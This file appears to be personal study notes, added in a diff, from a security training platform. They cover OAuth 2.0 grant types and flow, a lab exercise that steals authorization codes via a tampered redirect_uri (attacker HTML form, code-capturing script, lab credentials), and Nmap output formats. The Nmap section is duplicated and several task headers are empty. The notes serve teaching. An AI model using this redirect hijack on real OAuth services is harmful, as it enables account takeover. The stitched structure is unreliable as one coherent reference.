@@ -1,0 +1,386 @@
+__________________________________________________________________________________________
+
+
+TASK 3 OAuth Grant Types
+
+Authorization Code Grant
+    The Authorization Code grant is the most commonly used OAuth 2.0 flow suited for server-side applications (PHP, JAVA, .NET, etc.). 
+        1. The client redirects the user to the authorization server.
+        2. The user authenticates and grants authorization.
+        3. The authorization server redirects the user to the client with an authorization code.
+        4. The client exchanges the authorization code for an access token by requesting the authorization server's token endpoint.
+
+    This grant type is known for its enhanced security:
+        - The authorization code is exchanged for an access token server-to-server.
+        - The access token is not exposed to the user agent (e.g., browser), reducing the risk of token leakage.
+        - It supports using refresh tokens to maintain long-term access without repeated user authentication.
+
+Implicit Grant
+    The Implicit grant is primarily designed for mobile and web applications where clients cannot securely store secrets. 
+    It directly issues the access token to the client without requiring an authorization code exchange. 
+        1. The client redirects the user to the authorization server.
+        2. The user authenticates and grants authorization.
+        3. The authorization server returns an access token in the URL fragment.
+
+        Strengths:
+            - Simplified and suitable for clients who cannot securely store client secrets.
+            - Faster as it involves fewer steps than the authorization code grant.
+
+        Weaknesses:
+            - Less secure as the access token is exposed to the user agent and can be logged in the browser history.
+            - Does not support refresh tokens.
+
+Resource Owner Password Credentials Grant
+    The Resource Owner Password Credentials grant is used when the client is highly trusted by the resource owner, such as first-party applications. 
+        1. The client collects the user’s credentials (username and password) directly.
+        2. The client exchanges the credentials for an access token by sending them to the authorization server.
+        3. The authorization server verifies the credentials and issues an access token.
+
+        Strengths:
+            - Direct grant type requiring fewer interactions.
+            - Suitable for highly trusted applications where users confidently share credentials.
+
+        Weaknesses:
+            - Less secure due to direct credential sharing with the client.
+            - Unsuitable for third-party applications.
+
+Client Credentials Grant
+    The Client Credentials grant is used for server-to-server interactions without user involvement. In this flow:
+
+        1. The client authenticates with the authorization server using its client credentials (client ID and secret).
+        2. The authorization server validates the client credentials.
+        3. Upon successful validation, the authorization server issues an access token directly to the client.
+
+        Strengths:
+            - Suitable for backend services and server-to-server communication.
+            - Does not involve user credentials, reducing security risks related to user data exposure.
+
+        Weaknesses:
+            - Limited to scenarios where user authentication is not required.
+
+__________________________________________________________________________________________
+
+
+TASK 4 How OAuth Flow Work
+
+Authorization Request
+    Tom visits http://bistro.thm:8000/oauthdemo and clicks "Login via OAuth." 
+    CoffeeShopApp redirects his browser to the authorization server with an authorization request. 
+        http://coffee.thm:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback
+
+    The bistro website redirects Tom to the authorization server with these parameters:
+        - response_type=code    : This indicates that CoffeeShopApp is expecting an authorization code in return.
+        - state                 : A CSRF token to ensure that the request and response are part of the same transaction.
+        - client_id             : A public identifier for the client application, uniquely identifying CoffeeShopApp.
+        - redirect_uri          : The URL where the authorization server will send Tom after he grants permission. This must match one of the pre-registered redirect URIs for the client application.
+        - scope                 : Specifies the level of access requested, such as viewing coffee orders.
+
+    By including these parameters, the bistro app ensures that the authorization server understands what is requested and where to send the user afterwards.
+
+    Here is the Python code that redirects the user to the authorization server:
+        /*************************************************************************************
+        * def oauth_login(request):
+        *     app = Application.objects.get(name="CoffeeApp")
+        *     redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
+        *     
+        *     authorization_url = (
+        *         f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
+        *     )
+        *     return redirect(authorization_url)
+        *************************************************************************************/
+
+Authentication & Authorization
+    Tom logs in to the authorization server to verify his identity. 
+    After authentication, he consents to grant the bistro app access to his data, ensuring transparency and control.
+
+        1. User Login: Tom enters his username and password on the authorization server's login page.
+        2. Consent Prompt: After authentication, the authorization server presents Tom with a consent screen detailing what CoffeeShopApp requests access to (e.g., viewing his coffee orders). Tom must then decide whether to grant or deny these permissions.
+
+    This process ensures Tom's identity is verified and his consent obtained, maintaining security and user control over data.
+
+Authorization Response
+    If Tom consents, the authorization server issues an authorization code and redirects him to the bistro website via the redirect_uri, including the code and state parameter to maintain flow integrity.
+
+    The authorization server responds with the following:
+        code: CoffeeShopApp will use the authorization code to request an access token.
+        state: The CSRF token previously sent by CoffeeShopApp to validate the response.
+
+    An example authorization response would be:
+        https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123
+
+    This step ensures the authorization process is secure, linking the response to the bistro's initial request. 
+    The authorization code acts as a temporary token for CoffeeShopApp to access Tom's profile details.
+
+Token Request
+    The bistro website exchanges the authorization code for an access token by sending a POST request to the authorization server’s token endpoint with these parameters:
+        grant_type                  : Specifies the grant type (e.g., `authorization_code`).
+        code                        : The authorization code received earlier.
+        redirect_uri                : Must match the URI used in the authorization request.
+        client_id and client_secret : Authenticate the client application.
+
+    Using the above parameters, the following code will make a token request to /o/token endpoint.
+        /*************************************************************************************
+        * token_url = "http://coffee.thm:8000/o/token/"
+        * client_id = Application.objects.get(name="CoffeeApp").client_id
+        * client_secret = Application.objects.get(name="CoffeeApp").client_secret
+        * redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
+        *
+        * data = {
+        *     "grant_type": "authorization_code",
+        *     "code": code,
+        *     "redirect_uri": redirect_uri,
+        *     "client_id": client_id,
+        *     "client_secret": client_secret,
+        * }
+        *
+        * headers = {
+        *     'Content-Type': 'application/x-www-form-urlencoded',
+        *     'Authorization': f'Basic {base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()}',
+        * }
+        *
+        * response = requests.post(token_url, data=data, headers=headers)
+        * tokens = response.json()
+        *************************************************************************************/
+
+    The bistro app securely exchanges the authorization code for an access token, enabling access to Tom's profile details after server validation.
+
+Token Response
+    The authorization server validates the authorization code and client credentials, then responds with an access token and optionally a refresh token.
+
+    The authorization server's response includes the following:
+
+        access_token: Token that will be used to access Tom's details.
+        token_type: Typically "Bearer".
+        expires_in: The duration in seconds for which the access token is valid.
+        refresh_token (optional): A token used to obtain new access tokens without requiring the user to log in again.
+
+    With the access token, the bistro website can authenticate requests to the resource server to access Tom's profile. The refresh token allows obtaining new access tokens without repeated logins, ensuring a seamless user experience.
+    The OAuth 2.0 workflow is complete. The access token enables the bistro website to make authenticated requests to the resource server, including the token in the authorization header for secure access.
+
+__________________________________________________________________________________________
+
+
+TASK 5 Identifying the OAuth Services
+
+Identifying OAuth Usage in an Application
+
+Detecting OAuth Frameworks:
+    Login Options    : Look for external service providers (e.g., Google, Facebook) during login.
+    Network Traffic  : Check for redirects to authorization server URLs with parameters like response_type, client_id, redirect_uri, scope, and state.
+
+Example URL:
+    https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123
+
+Identifying OAuth Framework:
+    HTTP Headers    : Inspect headers and responses for framework-specific identifiers.
+    Source Code     : Search for libraries like django-oauth-toolkit, oauthlib, or passport.
+    Endpoints       : Analyze patterns like /oauth/authorize/ or /oauth/token/.
+    Error Messages  : Look for debug output revealing the technology stack.
+
+__________________________________________________________________________________________
+
+
+TASK 6 Exploiting OAuth - Stealing OAuth Token
+Tokens are vital in OAuth 2.0, granting access to protected resources. 
+Issued by the authorization server, they are sent to the client via the redirect_uri. 
+A poorly secured redirect_uri can be exploited, risking token hijacking.
+
+Role of Redirect_URI
+    The redirect_uri parameter specifies where the authorization server sends the token post-authorization. 
+    It must match a pre-registered URI to prevent open redirect vulnerabilities.
+
+Vulnerability
+    An insecure redirect_uri can lead to severe security issues. 
+    If attackers gain control over any domain or URI listed in the redirect_uri, they can manipulate the flow to intercept tokens.
+        Attacker's Strategy :   If an attacker gains control over dev.bistro.thm, they can exploit the OAuth flow. 
+                                By setting the redirect_uri to http://dev.bistro.thm/callback, the authorization server will send the token to this controlled domain.
+        Crafted Attack      :   The attacker initiates an OAuth flow and ensures the redirect_uri points to their controlled domain. After the user authorizes the application, the token is sent to http://dev.bistro.thm/callback. The attacker can now capture this token and use it to access protected resources.
+
+Preparing the Payload (Attacker Perspective)
+    Before starting the exercise, please ensure you are logged out of the OAuth provider as a victim by visiting the link http://coffee.thm:8000/admin/logout.
+
+    For this exercise, we assume that the attacker has compromised the domain dev.bistro.thm:8002 and can host any HTML page on the server. 
+    Consider Tom, a victim to whom we will send a link. 
+    The attacker can craft a simple HTML page (redirect_uri.html) with the following code:
+        /************************************************************************************
+        * <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
+        *     <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
+        *     <input type="submit" value="Hijack OAuth">
+        * </form>
+        ************************************************************************************/
+
+    This form sends a hidden redirect_uri parameter with the value http://dev.bistro.thm:8002/malicious_redirect.html and submits a request to http://coffee.thm:8000/oauthdemo/oauth_login/. 
+    The malicious_redirect.html page then intercepts the authorization code from the URL using the following code:
+        /************************************************************************************
+        * <script>
+        *     // Extract the authorization code from the URL
+        *     const urlParams = new URLSearchParams(window.location.search);
+        *     const code = urlParams.get('code');
+        *     document.getElementById('auth_code').innerText = code;
+        *     console.log("Intercepted Authorization Code:", code);
+        *     // code to save the acquired code in database/file etc
+        * </script>
+        ************************************************************************************/
+
+    Note:   The attacker, controlling the subdomain, can intercept and save the authorization code for later use. 
+            The redirection happens so quickly that the victim remains unaware of the hijacking.
+
+    The attacker can send Tom a crafted link (http://dev.bistro.thm:8002/redirect_uri.html) via social engineering or CSRF. 
+    When Tom clicks the link, it redirects to dev.bistro.thm:8002/redirect_uri.html. 
+    In the VM, open the link as a victim to observe the attack in action.
+
+    In the VM, when the victim clicks "Login via OAuth," the form sends a falsified redirect_uri to http://coffee.thm:8000/oauthdemo/oauth_login/. 
+    After entering credentials (victim:victim123), the OAuth authorization code is sent to the attacker's URL (http://dev.bistro.thm:8002/malicious_redirect.html), enabling interception and misuse.
+
+__________________________________________________________________________________________
+
+
+TASK 
+
+
+
+
+
+__________________________________________________________________________________________
+
+
+TASK 
+
+
+
+
+
+__________________________________________________________________________________________
+
+
+TASK 
+
+
+
+
+__________________________________________________________________________________________
+
+
+TASK5 : Saving the output
+
+Save Nmap scan results to a file using formats like Normal, Grepable, or XML. 
+
+Normal
+
+    Save scan results in normal format using -oN FILENAME. Example:
+           
+        /*************************************************************************************
+        * pentester@TryHackMe$ cat MACHINE_IP_scan.nmap 
+        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan 10.48.152.80
+        * Nmap scan report for 10.48.152.80
+        * Host is up (0.00086s latency).
+        * Not shown: 994 closed ports
+        * PORT    STATE SERVICE VERSION
+        * 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+        * 25/tcp  open  smtp    Postfix smtpd
+        * 80/tcp  open  http    nginx 1.6.2
+        * 110/tcp open  pop3    Dovecot pop3d
+        * 111/tcp open  rpcbind 2-4 (RPC #100000)
+        * 143/tcp open  imap    Dovecot imapd
+        * MAC Address: 02:A0:E7:B5:B6:C5 (Unknown)
+        * Device type: general purpose
+        * Running: Linux 3.X
+        * OS CPE: cpe:/o:linux:linux_kernel:3.13
+        * OS details: Linux 3.13
+        * Network Distance: 1 hop
+        * Service Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        *
+        * OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
+        *************************************************************************************/
+
+Grepable
+
+    The grepable format (-oG FILENAME) condenses results for easy filtering with tools like grep, but is less readable than normal output.
+
+        /*************************************************************************************
+        * pentester@TryHackMe$ cat MACHINE_IP_scan.gnmap 
+        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan 10.48.152.80
+        * Host: 10.48.152.80	Status: Up
+        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
+        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
+        *************************************************************************************/
+
+    Using grep on normal output lacks the host's IP, e.g., "80/tcp open http nginx 1.6.2," making it less useful for multiple scans. 
+    Grepable output includes the IP, providing complete information per line.
+            
+        /*************************************************************************************
+        * pentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap 
+        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
+        *************************************************************************************/
+
+XML
+    The third format is XML, saved with -oX FILENAME. 
+    Use -oA FILENAME to save in all three formats: normal, grepable, and XML.
+
+__________________________________________________________________________________________
+
+
+TASK5 : Saving the output
+
+Save Nmap scan results to a file using formats like Normal, Grepable, or XML. 
+
+Normal
+
+    Save scan results in normal format using -oN FILENAME. Example:
+           
+        /*************************************************************************************
+        * pentester@TryHackMe$ cat MACHINE_IP_scan.nmap 
+        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan 10.48.152.80
+        * Nmap scan report for 10.48.152.80
+        * Host is up (0.00086s latency).
+        * Not shown: 994 closed ports
+        * PORT    STATE SERVICE VERSION
+        * 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+        * 25/tcp  open  smtp    Postfix smtpd
+        * 80/tcp  open  http    nginx 1.6.2
+        * 110/tcp open  pop3    Dovecot pop3d
+        * 111/tcp open  rpcbind 2-4 (RPC #100000)
+        * 143/tcp open  imap    Dovecot imapd
+        * MAC Address: 02:A0:E7:B5:B6:C5 (Unknown)
+        * Device type: general purpose
+        * Running: Linux 3.X
+        * OS CPE: cpe:/o:linux:linux_kernel:3.13
+        * OS details: Linux 3.13
+        * Network Distance: 1 hop
+        * Service Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        *
+        * OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
+        *************************************************************************************/
+
+Grepable
+
+    The grepable format (-oG FILENAME) condenses results for easy filtering with tools like grep, but is less readable than normal output.
+
+        /*************************************************************************************
+        * pentester@TryHackMe$ cat MACHINE_IP_scan.gnmap 
+        * # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan 10.48.152.80
+        * Host: 10.48.152.80	Status: Up
+        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
+        * # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
+        *************************************************************************************/
+
+    Using grep on normal output lacks the host's IP, e.g., "80/tcp open http nginx 1.6.2," making it less useful for multiple scans. 
+    Grepable output includes the IP, providing complete information per line.
+            
+        /*************************************************************************************
+        * pentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap 
+        * Host: 10.48.152.80	Ports: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/	Ignored State: closed (994)	OS: Linux 3.13	Seq Index: 257	IP ID Seq: All zeros
+        *************************************************************************************/
+
+XML
+    The third format is XML, saved with -oX FILENAME. 
+    Use -oA FILENAME to save in all three formats: normal, grepable, and XML.
+
+__________________________________________________________________________________________
+
+
+
+
+Appendix:
